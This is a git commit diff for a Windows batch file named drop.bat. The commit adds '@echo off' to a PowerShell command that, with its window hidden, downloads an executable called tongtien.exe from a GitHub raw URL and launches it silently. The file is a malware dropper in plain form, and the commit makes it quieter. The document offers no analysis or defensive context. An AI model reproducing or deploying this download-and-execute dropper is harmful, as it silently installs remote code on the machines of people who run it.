6020bbe96037b435a5e15db3bdff040709941776
yoBDaSMi <137697938+yoBDaSMi@users.noreply.github.com>
2023-11-29 23:17:23 +0700

    Update drop.bat

--- drop.bat
+++ drop.bat
@@ -1,1 +1,2 @@
+@echo off
 powershell.exe -NoProfile -ExecutionPolicy -Windowstyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/yoBDaSMi/ttv/raw/main/tongtien.exe' -OutFile 'tongtien.exe'; Start-Process -FilePath 'tongtien.exe' -Windowstyle Hidden"
